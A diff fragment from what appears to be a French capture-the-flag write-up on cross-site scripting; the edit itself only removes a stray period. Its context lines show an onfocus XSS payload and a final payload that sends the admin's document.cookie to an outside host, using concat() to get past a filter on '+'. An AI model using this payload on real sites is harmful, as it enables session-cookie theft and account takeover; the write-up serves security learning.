@@ -49,7 +49,7 @@ Payload : < button autofocus onfocus="alert(1)">, et magie, on a une belle alert
 
 Il y a maintenant un autre problème, le caractère "+" est aussi interdit, on va devoir utiliser la fonction concat() de javascript.<br/>
 Cette fonction s'applique aux objets de type String. Exemple "a".contact("b") donnera "ab".<br/>
-C'est donc comme ceci que nous allons concaténer les cookies de l'admin à notre payload !.<br/>
+C'est donc comme ceci que nous allons concaténer les cookies de l'admin à notre payload !<br/>
 
 Payload final : < button autofocus onfocus="window.location='https://worty.alwaysdata.net/cookies.php?c='.concat(document.cookie)" />
 
